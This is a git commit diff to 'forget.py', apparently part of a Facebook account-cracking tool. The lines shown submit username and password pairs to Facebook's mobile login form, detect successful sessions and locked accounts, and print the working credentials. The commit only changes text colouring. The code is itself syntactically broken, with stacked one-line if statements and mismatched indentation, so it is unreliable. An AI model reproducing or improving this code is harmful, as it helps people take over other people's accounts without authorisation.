3a2b8ce4cc9f0c82b7b765f59feccc9573269a1f
Syafii-XD <101574975+Syafii-XD@users.noreply.github.com>
2022-05-22 19:55:27 +0700

    update forget.py

--- forget.py
+++ forget.py
@@ -522,7 +522,7 @@ def log_hasil(user, pasw):
     urlPost=session.post("https://mbasic.facebook.com"+link.get("action"),data=data)
     response=par(urlPost.text, "html.parser")
     if "Temukan Akun Anda" in re.findall("\<title>(.*?)<\/title>",str(urlPost.text)):print("[!] Nyalakan lalu matikan mode pesawat selama 2 Detik.")
-    if "c_user" in session.cookies.get_dict():if "Akun Anda Dikunci" in urlPost.text:if self.satua==True:print(f"\r\33[1;33m[CP] {self.user} | {self.pw}\33[37;1m\n",end="")
+    if "c_user" in session.cookies.get_dict():if "Akun Anda Dikunci" in urlPost.text:if self.satua==True:print(f"{P}[CP] {self.user} | {self.pw}",end="")
       print(f"\r[×] Akun sesi new\n\n",end="")
       else:
         aman+=1
